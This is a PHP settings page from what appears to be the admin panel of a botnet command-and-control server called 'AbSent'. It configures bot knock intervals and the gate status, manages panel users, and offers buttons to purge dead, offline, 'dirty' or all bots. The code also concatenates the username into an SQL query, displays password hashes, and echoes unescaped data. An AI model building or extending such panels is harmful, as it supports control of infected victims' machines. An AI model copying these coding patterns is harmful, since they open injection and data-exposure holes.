<?php
include '../include/session.php';
include '../include/geo.php';
include '../include/stats.php';
$userperms = $odb->query("SELECT permissions FROM users WHERE username = '".$username."'")->fetchColumn(0);

$details = $odb->prepare("SELECT * FROM users WHERE username = :id");

?>
<html lang="en" xmlns="http://www.w3.org/1999/html">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>AbSent Dash</title>
    <link href='https://fonts.googleapis.com/css?family=Roboto:400,500,300,100,700,900' rel='stylesheet' type='text/css'>
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    <!-- inject:css -->
    <link rel="stylesheet" href="../css/lib/getmdl-select.min.css">
    <link rel="stylesheet" href="../css/lib/nv.d3.css">
    <link rel="stylesheet" href="../css/application.css">
    <!-- endinject -->
</head>
<body>
<div class="mdl-layout mdl-js-layout mdl-layout--fixed-drawer mdl-layout--fixed-header is-small-screen">
    <header class="mdl-layout__header">
        <div class="mdl-layout__header-row">
            <div class="mdl-layout-spacer"></div>

            <div class="mdl-layout-spacer"></div>
            <div class="avatar-dropdown" id="icon">
            <span><?php echo $username; ?></span>
                <img src="../images/avatar.png">
            </div>

            <!-- Account dropdawn-->
            <ul class="mdl-menu mdl-list mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect mdl-shadow--2dp account-dropdown"
                for="icon">
                <li class="mdl-list__item mdl-list__item--two-line">
                    <span class="mdl-list__item-primary-content">
                    <span><?php echo $username; ?></span>
                    <span class="mdl-list__item-sub-title"><?php echo $userperms; ?></span>
                    </span>
                </li>
                <li class="list__item--border-top"></li>
                <li class="mdl-menu__item mdl-list__item">
                    <a href="account.php" class="mdl-list__item-primary-content">
                        <i class="material-icons mdl-list__item-icon">account_circle</i>
                        My account
                    </a>
                </li>
                <li class="mdl-menu__item mdl-list__item">
                    <a href="settings.php" class="mdl-list__item-primary-content">
                        <i class="material-icons mdl-list__item-icon">settings</i>
                       Settings
                    </a>
                </li>
                <li class="mdl-menu__item mdl-list__item">
                    <a href="../include/logout.php?logout=1" class="mdl-list__item-primary-content">
                        <i class="material-icons mdl-list__item-icon">exit_to_app</i>
                        Logout
                    </a>
                </li>
                
        </div>
    </header>

    <div class="mdl-layout__drawer">
        <header>AbSent</header>
        <nav class="mdl-navigation">
            <a class="mdl-navigation__link" href="index.php">
                <i class="material-icons" role="presentation">dashboard</i>
                Dashboard
            </a>
            <a class="mdl-navigation__link mdl-navigation__link" href="clients.php">
                <i class="material-icons" role="presentation">person</i>
                Clients
            </a>
            <a class="mdl-navigation__link" href="tasks.php">
                <i class="material-icons" role="presentation">map</i>
                Tasks
            </a>
        </nav>
    </div>
    <main class="mdl-layout__content">
        <?php
            if ($userperms != "admin")
            {
                echo '
                <div class="mdl-cell mdl-cell--6-col mdl-cell--3-offset">
                    <div class="mdl-card mdl-shadow--2dp">
                        <div class="mdl-card__title">
                            <h2 class="mdl-card__title-text">Error</h2>
                        </div>
                        <div class="mdl-card__supporting-text no-padding">
                            <h4>You do not have permission to view this page</h4>
                        </div>
                    </div>
                </div>         
                ';
                die();
            }
        ?>
        <div class="mdl-grid">
        <div class="mdl-cell mdl-cell--8-col mdl-cell--2-offset">
            <div class="mdl-card mdl-shadow--2dp">
                <div class="mdl-card__title">
                    <h2 class="mdl-card__title-text">Settings</h2>
                </div>
                <div class="mdl-card__supporting-text no-padding">  
                    <div class="mdl-tabs mdl-js-tabs mdl-js-ripple-effect">
                        <!-- Tab Bars -->
                        <div class="mdl-tabs__tab-bar">
                            <a href="#panel-settings-tab" class="mdl-tabs__tab is-active">Panel Settings</a>
                            <a href="#user-managment-tab" class="mdl-tabs__tab">User Managment</a>
                            <a href="#database-managment-tab" class="mdl-tabs__tab">Database Managment</a>
                        </div>

                        <!-- MDL tab panels, is-active to denote currently active -->
                        <div class="mdl-tabs__panel is-active" id="panel-settings-tab">
                            <br>
                            <div align="center">
                                <form method="POST">
                                    <div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label full-size" style="width: 50%">
                                    <!-- input pattern attribute -->
                                        <input class="mdl-textfield__input" type="text" pattern="-?[0-9]*(\.[0-9]+)?" name="knockInt" />
                                        <!-- mdl-textfield__label -->
                                        <label class="mdl-textfield__label" for="knockInt">Knock Interval (Minutes)</label>
                                        <!-- class "mdl-textfield__error" -->
                                        <span class="mdl-textfield__error">Input is not a number</span>
                                    </div>
                                    <br>
                                    <div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label full-size" style="width: 50%">
                                    <!-- input pattern attribute -->
                                        <input class="mdl-textfield__input" type="text" pattern="-?[0-9]*(\.[0-9]+)?" name="deadInt" />
                                        <!-- mdl-textfield__label -->
                                        <label class="mdl-textfield__label" for="deadInt">Dead After (Days)</label>
                                        <!-- class "mdl-textfield__error" -->
                                        <span class="mdl-textfield__error">Input is not a number</span>
                                    </div>
                                    <br>
                                    <div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label getmdl-select full-size" style="width: 50%">
                                        <input class="mdl-textfield__input" type="text" id="gateStatus" name="gateStatus" readonly tabIndex="-1"/>
                                        <label class="mdl-textfield__label" for="gateStatus">Gate Status</label>
                                        <ul class="mdl-menu mdl-menu--bottom-left mdl-js-menu dark_dropdown" for="gateStatus">
                                            <li class="mdl-menu__item" >Opened</li>
                                            <li class="mdl-menu__item" >Closed</li>
                                        </ul>
                                        <label for="gateStatus"><i class="mdl-icon-toggle__label material-icons">arrow_drop_down</i></label>
                                    </div>
                                    <div class="mdl-cell mdl-cell--12-col mdl-cell--4-col-phone submit-cell" align="right">
                                        <button type="submit" name="updatePanel" class="mdl-button mdl-js-button mdl-button--raised color--light-blue">Update</button>
                                    </div>                                                                    
                                </form>
                            </div>
                        </div>
                        
                        <!-- MDL Tab panel 2 -->
                        <div class="mdl-tabs__panel" id="user-managment-tab">
                            <table class="mdl-data-table mdl-js-data-table full-width">
                                <tr>
                                    <th>#</th>
                                    <th class="mdl-data-table__cell--non-numeric">Username</th>
                                    <th class="mdl-data-table__cell--non-numeric">Password Hash</th>
                                    <th class="mdl-data-table__cell--non-numeric">Status</th>
                                    <th class="mdl-data-table__cell--non-numeric">Permissions</th>
                                    <th class="mdl-data-table__cell--non-numeric">Actions</th>
                                </tr>
                                <?php
                                    $users = $odb->query("SELECT * FROM users");
                                    while ($user = $users->fetch(PDO::FETCH_ASSOC))
                                    {
                                        $action;
                                        if ($user['status'] == 2) 
                                        {
                                            $status = 'Banned';
                                            $action = '<a href="?p=settings&action=unban"><i class="material-icons" role="presentation">done</i></a>';
                                        }
                                        elseif ($user['status'] == 1) 
                                        {
                                            $status = 'Active';
                                            $action = '<a href="?p=settings&action=ban"><i class="material-icons" role="presentation">lock</i></a>';
                                        }
                                        echo '
                                            <tr class="mdl-data-table__cell--non-numeric">
                                                <td class="mdl-data-table__cell--non-numeric">'.$user['id'].'</td>
                                                <td class="mdl-data-table__cell--non-numeric">'.$user['username'].'</td>
                                                <td class="mdl-data-table__cell--non-numeric">'.$user['password'].'</td>
                                                <td class="mdl-data-table__cell--non-numeric">'.$status.'</td>
                                                <td class="mdl-data-table__cell--non-numeric">'.$user['permissions'].'</td>
                                                <td class="mdl-data-table__cell--non-numeric">'.$action.'</td>
                                            </tr>
                                        ';
                                    }
                                ?>
                            </table>
                        </div>
                        
                        <!-- MDL Tab panel 3 -->
                        <div class="mdl-tabs__panel" id="database-managment-tab">
                            <div align="center">
                                <p>The database is currently using <b><?php echo $odb->query("SELECT ROUND(SUM(data_length + index_length) / 1024, 2) FROM information_schema.TABLES WHERE table_schema = (SELECT DATABASE())")->fetchColumn(0); ?> KB</b> of space, with <b><?php echo number_format($odb->query("SELECT SUM(table_rows) FROM information_schema.TABLES WHERE table_schema = (SELECT DATABASE())")->fetchColumn(0)); ?></b> rows in total.</p>
                                <hr>
                                <table class="mdl-data-table mdl-js-data-table">
                                <tr>
                                    <td class="mdl-data-table__cell--non-numeric"><a href="?p=settings&clear=dead" class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect mdl-color--red-400">Clear Dead Bots</a></td>
                                    <td class="mdl-data-table__cell--non-numeric"><a href="?p=settings&clear=offline"class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect mdl-color--red-400">Clear Offline Bots</a></td>
                                </tr>
                                <tr>
                                    <td class="mdl-data-table__cell--non-numeric"><a href="?p=settings&clear=dirty" class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect mdl-color--red-400">Clear Dirty Bots</a></td>
                                    <td class="mdl-data-table__cell--non-numeric"><a onclick="ask('1')" class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect mdl-color--red-400">Clear All Bots</a></td>
                                </tr>
                                </table>
                                <br>
                            </div>                         
                        </div> 
                    </div>
                </div>  
            </div>       
        </div>
    </main>
</div>
<script type="text/javascript">
function ask(id)
{
    if (id == "1")
    {
        if (confirm("WARNING: You are about to clear all of the bots from your database! Are you sure you want to do this?"))
        {
            setTimeout('window.location = "?p=settings&clear=all"', 1000);
        }
    }
}
</script>
<!-- inject:js -->
<script src="../js/d3.js"></script>
<script src="../js/getmdl-select.min.js"></script>
<script src="../js/material.js"></script>
<script src="../js/nv.d3.js"></script>
<!-- endinject -->

</body>
</html>
